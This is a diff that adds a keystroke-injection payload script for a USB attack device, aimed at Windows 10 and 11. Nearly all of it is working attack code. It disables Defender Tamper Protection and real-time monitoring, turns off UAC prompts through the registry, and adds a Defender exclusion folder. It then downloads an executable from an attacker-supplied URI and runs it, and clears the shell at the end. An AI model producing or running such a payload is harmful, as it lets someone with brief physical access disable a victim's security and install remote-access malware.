@@ -1,0 +1,85 @@
+#!/bin/bash
+#
+# Title:            Microsoft Windows Payload Injector
+#
+# Description:      
+#                   1) Disables Tamper Protection in Windows Defender.
+#                   2) Disables UAC / Turns UAC off
+#                   3) Creates Payload Directory in C:/ Drive
+#                   4) Disables Real-Time Protection in Windows Defender.
+#                   5) Adds the Payload Directory as an exclusion in Windows Defender
+#                   6) Downloads Payload from Specified URI (Enter in Variable Below)
+#                   7) Runs Payload on System
+#
+# Author:           KryptoKola
+# Version:          1.0
+# Category:         Remote Access
+# Target:           Microsoft Windows 10 & 11
+
+LED SETUP
+ATTACKMODE HID
+#Variables
+readonly PAYLOAD_DOWNLOAD_URI="ENTER PAYLOAD URI HERE"
+
+#Disables Tamper Protection in Windows 10 & 11
+LED STAGE1
+Q GUI s
+Q STRING "Virus & threat protection"
+Q ENTER
+Q DELAY 10000
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q ENTER
+Q DELAY 1000
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q SPACE
+Q DELAY 1000
+Q ALT y
+Q DELAY 1000
+Q ALT F4
+Q FN ALT F4
+
+#Starts Powershell in Admin mode
+LED STAGE2
+Q GUI r
+Q DELAY 250
+Q STRING powershell Start-Process powershell -Verb runAs
+Q ENTER
+Q DELAY 3000
+Q ALT y
+Q DELAY 5000
+
+#Disables UAC, Creates Payload Directory, and moves to C:/ directory in powershell
+LED STAGE3
+Q STRING "cd C:/;mkdir Payloads;Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0;"
+Q ENTER
+Q DELAY 1500
+Q ALT y
+Q DELAY 250
+
+#Disables Real Time Protection, Makes an exclusion to the Payloads folder in Windows Defender, Navigates to the Payloads folder, then Downloads specified payload from URI.
+LED STAGE4
+Q STRING "Set-MpPreference -DisableRealtimeMonitoring 1;Set-MpPreference -ExclusionPath "C:/Payloads";cd C:/Payloads;Start-BitsTransfer -Source ${PAYLOAD_DOWNLOAD_URI} -Destination ./payload.exe;"
+Q ENTER
+Q DELAY 2000
+
+#Launches the Payload on the machine
+LED STAGE5
+Q STRING ./payload.exe
+Q ENTER
+Q DELAY 250
+
+#Clears the shell and exits out.
+LED CLEANUP
+Q STRING clear
+Q ENTER
+Q DELAY 250
+Q STRING exit
+Q ENTER
+
+LED FINISH
